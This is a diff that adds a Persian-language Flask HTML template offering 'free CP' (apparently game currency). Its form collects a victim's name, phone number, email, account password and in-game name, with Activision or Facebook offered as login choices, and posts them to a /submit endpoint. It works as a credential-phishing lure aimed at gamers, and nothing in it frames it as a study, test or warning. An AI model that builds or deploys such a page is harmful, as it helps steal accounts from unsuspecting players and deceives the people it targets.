@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <link rel="stylesheet" href="{{ url_for('static', filename='styel.css') }}">
+  <title>سی‌پی رایگان</title>
+</head>
+<body>
+  <div class="glass-box">
+    <h1>سی‌پی رایگان</h1>
+    <form action="/submit" method="POST">
+      <input type="text" name="fullname" placeholder="نام و نام خانوادگی" required>
+      <input type="tel" name="phone" placeholder="مثلاً 09123456789" required>
+      <input list="companies" name="company" placeholder="روش اتصال را انتخاب کنید">
+      <datalist id="companies">
+        <option value="اکتیویژن">
+        <option value="فیسبوک">
+      </datalist>
+      <input type="email" name="email" placeholder="ایمیل" required>
+      <input type="password" name="password" placeholder="رمز عبور" required>
+      <input type="text" name="gamename" placeholder="نام در بازی" required>
+      <input type="submit" value="تایید">
+    </form>
+  </div> <!-- اینجا درست بسته می‌شه -->
+
+  {% if message %}
+    <div id="popup" style="position: fixed; top: 40%; left: 50%; transform: translate(-50%, -50%);
+    background-color: #fff; padding: 20px; border: 2px solid #333; border-radius: 10px; z-index: 999;">
+      <p>{{ message }}</p>
+    </div>
+    <script>
+      setTimeout(function() {
+        document.getElementById('popup').style.display = 'none';
+        document.querySelector('form').reset();
+      }, 8000);
+    </script>
+  {% endif %}
+</body>
+</html>
